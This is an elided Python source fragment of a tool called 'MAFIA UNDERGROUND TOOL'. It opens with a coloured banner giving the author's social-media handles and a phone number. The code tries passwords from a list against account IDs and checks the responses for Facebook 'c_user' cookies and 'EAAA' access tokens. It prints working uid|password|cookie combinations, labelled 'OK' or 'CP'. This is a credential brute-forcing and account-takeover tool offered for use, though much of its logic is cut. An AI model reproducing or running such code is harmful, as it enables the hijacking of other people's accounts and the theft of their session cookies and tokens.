...
\x1b[0;33m║WELCOME TO MAFIA UNDERGROUND TOOL [Sho4u tech].  ║

\x1b[0;33m║       #TOOL AUTHOR [S.h.o] MAFIA BOSS. ║
...
\x1b[0;33m║#YOUTUBE : https://youtube.com/Sho4u tech.  ║

\x1b[0;33m║#FACEBOOK : NAME [Mahr Shoaib ].       ║

\x1b[0;33m║#GITHUB : https://github.com/mahrbadshah.   ║

\x1b[0;33m║#WHATSAPP : +923409639924.                   ║
...
def cek_ttl_cp(uid, pw):
	...
	try:
		...
		with requests.Session() as ses:
			...
			print("\r\033[0;95m[Sho4u-CP] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
	...
	try:
		...
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				...
				print("\r\033[0;95m[Sho4u-CP] %s|%s\033[0;92m        "%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[Sho4u-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				...
				print("\r\033[0;95m[Sho4u-CP] %s|%s\033[0;91m        "%(uid, pw))
